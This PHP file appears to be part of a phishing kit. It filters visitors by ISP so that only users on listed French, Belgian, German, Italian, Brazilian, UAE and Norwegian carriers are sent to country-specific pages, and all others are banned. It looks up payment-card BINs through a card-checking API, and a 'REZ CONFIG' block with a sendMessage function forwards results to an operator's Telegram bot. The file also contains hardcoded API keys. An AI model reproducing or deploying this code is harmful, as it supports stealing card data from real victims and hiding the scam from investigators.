<?php 
session_start();
function getIpInfo($ip = '')
{
        $ipinfo = file_get_contents("https://pro.ip-api.com/json/" . $ip . "?key=s3DD9L9nYAxD9mz");
        $ipinfo_json = json_decode($ipinfo, true);
        return $ipinfo_json;
}

function update($country){
    $jsonString = @file_get_contents('stats.json');
    $i = 0;
    if ($jsonString === FALSE) {
        $jsonString = file_get_contents('../server/stats.json');
        $i = 1;
        if ($jsonString === FALSE) {
            $jsonString = file_get_contents('../../server/stats.json');
            $i = 2;
        }
    }
    $data = json_decode($jsonString, true);

    $data['country']["$country"] = (string)((int)$data['country']["$country"] + 1);

    $newJsonString = json_encode($data);
    if ($i == 0) {
        file_put_contents('stats.json', $newJsonString);
    }else if($i == 1){
        file_put_contents('../server/stats.json', $newJsonString);
    }else if($i == 2){
        file_put_contents('../../server/stats.json', $newJsonString);
    }
    

}

function getBin($bin){
    
    $data = file_get_contents("https://api.chk.cards/v1/bins?key=73a20a373ccadd6952e0ab155ffd7a71deb40ef9&bin=$bin&format=json");
    return $data;
}


function country($ip){
    $visitor_ip = $ip;
    $ipinfo_json = getIpInfo($visitor_ip);
    $org = @$ipinfo_json['as'];
    if (strpos($org, "wanadoo") || strpos($org, "bbox") || strpos($org, "Bouygues") || strpos($org, "Orange") || strpos($org, "sfr") || strpos($org, "SFR") || strpos($org, "Sfr") || strpos($org, "free") || strpos($org, "Free") || strpos($org, "FREE")|| strpos($org, "Base") || strpos($org, "Scarlet") || strpos($org, "Proximus") || strpos($org, "VOO Mobile") || strpos($org, "Telenet") || strpos($org, "Lycamobile") || strpos($org, "free") || strpos($org, "Free") || strpos($org, "FREE") || strpos($org, "red") || strpos($org, "proxad") || strpos($org, "club-internet") || strpos($org, "oleane") || strpos($org, "nordnet") || strpos($org, "liberty") || strpos($org, "colt") || strpos($org, "belgacom") || strpos($org, "proximus") || strpos($org, "skynet") || strpos($org, "aol") ||  strpos($org, "Youfone")) {
        update('fr');
        return 'fr';
    }else if (strpos($org, "T-Mobile") || strpos($org, "O2") || strpos($org, "Vodafone")) {
        update('de');
        return 'de';
    }else if (strpos($org, "TIM") || strpos($org, "Wind Tre") || strpos($org, "Vodafone Italia") || strpos($org, "Iliad")) {
        update('it');
        return 'it';
    }else if (strpos($org, "Vivo") || strpos($org, "Claro") || strpos($org, "Oi") || strpos($org, "Telemig") || strpos($org, "Amazônia") || strpos($org, "Brasil Telecom") || strpos($org, "Nextel") || strpos($org, "CTBC") || strpos($org, "Sercomtel")) {
        update('brz');
        return 'brz';
    }else if (strpos($org, "Etisalat") || strpos($org, "Du") || strpos($org, "ETILSAT") || strpos($org, "DU") || strpos($org, "Emirates")) {
        update('aeu');
        return 'aeu';
    }else if (strpos($org,"Telenor") || strpos($org,"Telia") || strpos($org,"Ice.net") || strpos($org,"telia") || strpos($org,"TELIA") || strpos($org,"Oslo") || strpos($org,"telenor") || strpos($org, "TELENOR")|| strpos($org, "Uninett")|| strpos($org, "Oslonett")) {
        update('nrw');
        return 'nrw';
    }else{
        return 'ban';
    }
}


$testmode = true;
$time = 20;

# REZ CONFIG
$token = "";
$chatid = "";
$email = "";

function sendMessage($message) {
    global $token,$chatid;
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}


?>

